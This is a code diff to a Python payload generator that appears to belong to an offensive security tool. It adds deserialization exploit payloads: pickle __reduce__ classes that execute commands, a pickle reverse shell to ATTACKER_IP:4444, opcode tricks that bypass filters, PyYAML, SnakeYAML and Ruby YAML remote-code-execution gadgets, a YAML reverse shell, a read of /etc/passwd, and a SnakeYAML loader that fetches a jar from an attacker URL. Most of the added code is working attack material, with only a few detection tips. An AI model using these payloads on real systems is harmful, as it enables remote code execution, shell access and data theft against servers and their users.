@@ -413,6 +413,7 @@ class DeserializationPayloadGenerator:
         "php_payloads",
         "python_payloads",
         "java_references",
+        "yaml_payloads",
         "detection_tips",
     ]
 
@@ -447,6 +448,8 @@ class DeserializationPayloadGenerator:
             return self._python_payloads(command)
         elif operation == "java_references":
             return self._java_references(command)
+        elif operation == "yaml_payloads":
+            return self._yaml_payloads(command)
         elif operation == "detection_tips":
             return self._detection_tips(fmt)
 
@@ -582,11 +585,58 @@ class DeserializationPayloadGenerator:
         result.append("This imports os.system and calls it with 'id'")
         result.append("")
 
+        # Advanced pickle techniques
+        result.append("=== Advanced Pickle Techniques ===")
+        result.append("")
+        result.append("--- Reverse Shell via pickle ---")
+        result.append("```python")
+        result.append("import pickle, base64, os")
+        result.append("")
+        result.append("class RevShell:")
+        result.append("    def __reduce__(self):")
+        result.append("        return (os.system, (")
+        result.append("            'python3 -c \\'import socket,subprocess,os;'")
+        result.append("            's=socket.socket();s.connect((\"ATTACKER_IP\",4444));'")
+        result.append("            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'")
+        result.append("            'os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\\'',))")
+        result.append("")
+        result.append("print(base64.b64encode(pickle.dumps(RevShell())).decode())")
+        result.append("```")
+        result.append("")
+        result.append("--- Pickle with subprocess.check_output (get output back) ---")
+        result.append("```python")
+        result.append("import pickle, base64, subprocess")
+        result.append("")
+        result.append("class Exploit:")
+        result.append("    def __reduce__(self):")
+        result.append(f"        return (subprocess.check_output, (['{command}'], {{'shell': True}}))")
+        result.append("")
+        result.append("print(base64.b64encode(pickle.dumps(Exploit())).decode())")
+        result.append("```")
+        result.append("")
+        result.append("--- Pickle with eval (Python expression) ---")
+        result.append("```python")
+        result.append("import pickle, base64")
+        result.append("")
+        result.append("class Exploit:")
+        result.append("    def __reduce__(self):")
+        result.append(f"        return (eval, (\"__import__('os').popen('{command}').read()\",))")
+        result.append("")
+        result.append("print(base64.b64encode(pickle.dumps(Exploit())).decode())")
+        result.append("```")
+        result.append("")
+        result.append("--- Handcrafted pickle opcodes (bypass class name filters) ---")
+        result.append("Raw pickle: cos\\nsystem\\n(S'" + command + "'\\ntR.")
+        result.append("Base64: " + "Y29zCnN5c3RlbQooUydpZCcKdFIu")
+        result.append("")
+
         result.append("=== Tips ===")
         result.append("1. pickle.loads() is always dangerous - no safe way to use it")
         result.append("2. Check for yaml.load() without Loader=SafeLoader")
         result.append("3. Look for base64-encoded blobs in cookies or form fields")
         result.append("4. jsonpickle and shelve are also vulnerable")
+        result.append("5. Some apps use pickle protocol 0 (text) vs 2+ (binary) — try both")
+        result.append("6. If pickle is filtered, try cpickle or _pickle module names")
 
         return "\n".join(result)
 
@@ -653,6 +703,98 @@ class DeserializationPayloadGenerator:
         result.append("4. Check for Java serialization in cookies, JMX, RMI, T3 protocol")
         result.append("5. Base64 encode output: java -jar ysoserial.jar CommonsCollections1 '"
                        + command + "' | base64")
+
+        return "\n".join(result)
+
+    def _yaml_payloads(self, command: str) -> str:
+        result = [
+            "[DeserializationPayloadGenerator] YAML Deserialization Payloads",
+            "=" * 55,
+            "",
+        ]
+
+        # PyYAML
+        result.append("=== PyYAML (Python) ===")
+        result.append("")
+        result.append("--- yaml.load() without SafeLoader (pre-6.0) ---")
+        result.append(f"!!python/object/apply:os.system ['{command}']")
+        result.append("")
+        result.append(f"!!python/object/apply:subprocess.check_output [['{command}'], {{shell: true}}]")
+        result.append("")
+        result.append(f"!!python/object/new:subprocess.check_output [['{command}']]")
+        result.append("")
+        result.append("--- Reverse shell via YAML ---")
+        result.append("!!python/object/apply:os.system")
+        result.append("- 'python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'")
+        result.append("")
+        result.append("--- File read via YAML ---")
+        result.append("!!python/object/apply:builtins.open")
+        result.append("- '/etc/passwd'")
+        result.append("- 'r'")
+        result.append("")
+        result.append("--- Bypass SafeLoader fallback ---")
+        result.append("!!python/object/apply:os.popen")
+        result.append(f"- '{command}'")
+        result.append("# Only works with yaml.load(data, Loader=yaml.Loader) or yaml.unsafe_load()")
+        result.append("")
+
+        # SnakeYAML (Java)
+        result.append("=== SnakeYAML (Java) ===")
+        result.append("")
+        result.append("--- ScriptEngine RCE ---")
+        result.append("!!javax.script.ScriptEngineManager [")
+        result.append("  !!java.net.URLClassLoader [[")
+        result.append("    !!java.net.URL ['http://ATTACKER/exploit.jar']")
+        result.append("  ]]")
+        result.append("]")
+        result.append("")
+        result.append("--- Runtime.exec ---")
+        result.append("!!java.lang.Runtime")
+        result.append(f"  exec: '{command}'")
+        result.append("")
+        result.append("--- ProcessBuilder ---")
+        result.append("!!java.lang.ProcessBuilder")
+        result.append(f"  command: ['/bin/sh', '-c', '{command}']")
+        result.append("  start: []")
+        result.append("")
+
+        # Ruby YAML
+        result.append("=== Ruby YAML (Psych) ===")
+        result.append("")
+        result.append("--- Older Ruby (<2.7) ---")
+        result.append("--- !ruby/object:Gem::Installer")
+        result.append("i: x")
+        result.append("--- !ruby/object:Gem::SpecFetcher")
+        result.append("i: y")
+        result.append("--- !ruby/object:Gem::Requirement")
+        result.append("requirements:")
+        result.append("  !ruby/object:Gem::Package::TarReader")
+        result.append("  io: &1 !ruby/object:Net::BufferedIO")
+        result.append("    io: &1 !ruby/object:Gem::Package::TarReader::Entry")
+        result.append(f'       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module \'Kernel\'\n               method_id: :system\n           git_set: {command}')
+        result.append("")
+        result.append("--- ERB-based (Ruby) ---")
+        result.append("--- !ruby/object:Gem::Installer")
+        result.append(f'i: "<%= `{command}` %>"')
+        result.append("")
+
+        # Detection and tips
+        result.append("=== YAML Deserialization Detection ===")
+        result.append("")
+        result.append("Indicators a target uses YAML:")
+        result.append("- Content-Type: application/x-yaml or text/yaml")
+        result.append("- File extension: .yml, .yaml")
+        result.append("- Configuration file upload features")
+        result.append("- API endpoints accepting YAML input")
+        result.append("- Error messages containing 'yaml', 'YAML', 'SnakeYAML', 'Psych'")
+        result.append("")
+        result.append("=== Tips ===")
+        result.append("1. PyYAML yaml.load() is dangerous without Loader=SafeLoader")
+        result.append("2. PyYAML 6.0+ defaults to SafeLoader (yaml.load requires Loader param)")
+        result.append("3. SnakeYAML allows arbitrary class instantiation by default")
+        result.append("4. For SnakeYAML, host a malicious .jar on your server")
+        result.append("5. Ruby YAML deserialization varies heavily by Ruby version")
+        result.append("6. Some apps convert YAML->JSON — try YAML-specific constructors")
 
         return "\n".join(result)
 
